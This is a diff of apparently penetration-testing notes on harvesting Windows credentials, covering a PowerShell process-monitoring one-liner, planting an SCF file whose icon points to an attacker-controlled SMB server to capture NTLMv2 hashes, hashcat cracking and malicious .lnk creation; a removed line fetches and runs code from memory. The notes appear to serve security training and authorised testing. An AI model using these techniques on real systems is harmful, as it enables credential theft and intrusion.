@@ -10,24 +10,13 @@ We can use filters to find sensitive information. In the example below, we can s
 
 ![[ftp.webp]]
 
->[!tip]
->If the client gives us an attack machine within an environment, we should run `wireshark` or `tcpdump` for a while to see if we find anything interesting. We can use [net-creds](https://github.com/DanMcInerney/net-creds) to search for passwords and hashes in a `pcap` file.
-
 ## Process Command Lines
 
-When getting a shell, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can monitor for this using the following small `PowerShell` one-liner:
+When getting a shell, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can monitor for this using the following `PowerShell` one-liner:
 
 ```powershell
 while($true) { $process = Get-WmiObject Win32_Process | Select-Object CommandLine; Start-Sleep 1; $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine; Compare-Object -ReferenceObject $process -DifferenceObject $process2 }
 ```
-
-We can run it from memory like this:
-
-```shell
-IEX(iwr '<url>')
-```
-
-We should let it run for some time to gather everything we can.
 
 ## Vulnerable Services
 
@@ -35,9 +24,9 @@ There are some vulnerabilities that can be used to escalate privileges, but requ
 
 ## SCF on a File Share
 
-A Shell Command File (`SCF`) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An `SCF` file can be manipulated to have the icon file location point to a specific `UNC` path (`\\<host>\<path>`) and have Windows Explorer start an `SMB` session when the folder where the `.scf` file resides is accessed. We can steal `NTLMv2` password hashes by changing the `IconFile` to an `SMB` server we control, like the one from `responder`, which will also show us the hashes.
+A Shell Command File (`SCF`) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An `SCF` file can be manipulated to have the icon file location point to a specific `UNC` path (`\\<host>\<path>`) and have Windows Explorer start an `SMB` session when the folder where the `.scf` file resides is accessed. We can steal `NTLMv2` password hashes by changing the `IconFile` to an `SMB` server we control.
 
-We can create a file with a name like `@Inventory.scf`. We put an `@` at the start so it appears at the top of the directory to ensure it's seen and executed by Windows Explorer as soon as the user accesses the share.
+We can create a file with a name like `@Inventory.scf`. The `@` at the start makes the file show at the top of the directory to ensure it's seen and executed by Windows Explorer as soon as the user accesses the share.
 
 ```scf
 [Shell]
@@ -55,7 +44,7 @@ And then crack with `hashcat` mode 5600 for `NTLMv2`.
 
 ## Capturing Hashes with Malicious `.lnk` File
 
-Using `SCF`s no longer works on Server 2019 hosts, but we can achieve the same with `.lnk` files. It's not as straightforward as an `.scf`. We can create one with `PowerShell`:
+Using `SCF`s no longer works on Windows Server 2019 and above hosts, but we can achieve the same with `.lnk` files. It's not as straightforward as an `.scf`. Here is the `PowerShell` to create one:
 
 ```powershell
 $objShell = New-Object -ComObject WScript.Shell
